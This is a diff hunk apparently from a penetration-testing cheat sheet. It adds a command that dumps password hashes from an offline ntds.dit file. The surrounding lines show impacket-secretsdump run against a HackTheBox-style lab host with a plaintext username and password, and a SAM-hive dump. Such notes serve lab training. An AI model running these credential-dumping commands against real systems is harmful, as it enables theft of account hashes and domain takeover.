@@ -563,6 +563,8 @@ impacket-secretsdump htb.local/userattk:takSecbe987@10.10.10.161 -just-dc-user A
 
 # SAM
 impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
+# ntds.dit
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY local
 ```
 
 
